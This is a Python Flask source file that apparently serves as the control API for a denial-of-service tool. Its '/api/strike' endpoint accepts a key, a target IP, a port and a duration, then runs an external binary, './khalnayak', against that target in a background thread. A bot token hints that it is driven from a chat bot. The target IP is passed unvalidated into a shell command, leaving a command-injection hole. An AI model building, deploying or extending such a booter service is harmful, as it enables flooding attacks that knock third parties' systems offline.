import os
import subprocess
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)

# Token from environment variable (GitHub hidden)
AUTH_KEY = os.environ.get('AUTH_KEY', 'CHANGE_THIS')
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'CHANGE_THIS')

def fire(ip, port, sec):
    try:
        cmd = f"./khalnayak {ip} {port} {sec}"
        subprocess.run(cmd, shell=True, timeout=int(sec)+5)
    except:
        pass

@app.route('/api/strike', methods=['GET'])
def strike():
    key = request.args.get('key')
    if key != AUTH_KEY:
        return jsonify({"error": "Unauthorized"}), 403
    
    ip = request.args.get('ip')
    port = request.args.get('port')
    sec = request.args.get('time', "60")
    
    if not ip or not port:
        return jsonify({"error": "Missing IP or Port"}), 400
    
    if not port.isdigit() or not sec.isdigit():
        return jsonify({"error": "Invalid format"}), 400
    
    threading.Thread(target=fire, args=(ip, int(port), int(sec))).start()
    
    return jsonify({
        "success": True,
        "target": ip,
        "port": port,
        "duration": sec
    })

@app.route('/api/health')
def health():
    return jsonify({"status": "alive"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
